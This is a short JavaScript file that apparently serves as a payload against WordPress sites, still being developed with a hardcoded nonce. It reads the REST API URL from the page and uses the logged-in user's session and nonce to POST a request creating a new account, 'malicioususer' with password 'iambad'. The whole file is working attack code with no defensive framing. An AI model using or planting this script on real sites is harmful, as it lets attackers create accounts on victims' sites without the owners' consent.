/**
 * Get a Promise for the current nonce for authentication.
 *
 * @return Promise A promise for the current WordPress nonce.
 */
function getNoncePromise() {
  // This will ONLY work on my machine.
  // During development we are returning a hardcoded nonce.
  // I got this value by running 'wpApiSettings.nonce' in the browser console
  // while on a backend editor page.
  return new Promise((resolve, reject) => {
    resolve('b1772887b9');
  });
}

/**
 * Get the password to assign to the new user.
 *
 * @return string The new user password.
 */
function getPassword() {
  return 'iambad';
}

function getFetchOptionsPromise() {
  return getNoncePromise()
    .then((nonce) => {
      return({
        method: 'POST',
        credentials: 'same-origin',
        headers: {
          'X-WP-Nonce': nonce,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: 'malicioususer',
          email: 'malicioususer@example.com',
          password: getPassword(),
          roles: 'subscriber',
        })
      })
    })
    .catch((response) => {
      console.error('Failed to get Nonce', {response});
      reject(response);
    });
}

/**
 * Get the WP REST API base URL.
 *
 * @return string WP REST API base URL.
 */
function getAPIURL() {
  const links = document.getElementsByTagName( 'link' );
  const link = Array.prototype.filter.call( links, function ( item ) {
      return ( item.rel === 'https://api.w.org/' );
  } );
  return link[0].href;
}

/**
 * Get the WP REST API endpoint for users.
 *
 * @return string WP REST API endpoint for users.
 */
function getUsersEndpoint() {
  return getAPIURL() + 'wp/v2/users';
}

function getRequestPromise() {
  return new Promise((resolve, reject) => {
    getFetchOptionsPromise()
      .then((fetchOptions) => {
        resolve(new Request(getUsersEndpoint(), fetchOptions));
      })
      .catch((response) => {
        console.error('Failed to get request', {response});
        reject(response);
      });
    });
}

getRequestPromise()
  .then((request) => fetch(request))
  .then((response) => response.json())
  .then((data) => {
    console.log({data});
  })
  .catch((response) => {
    console.error('Failed', {response});
  })
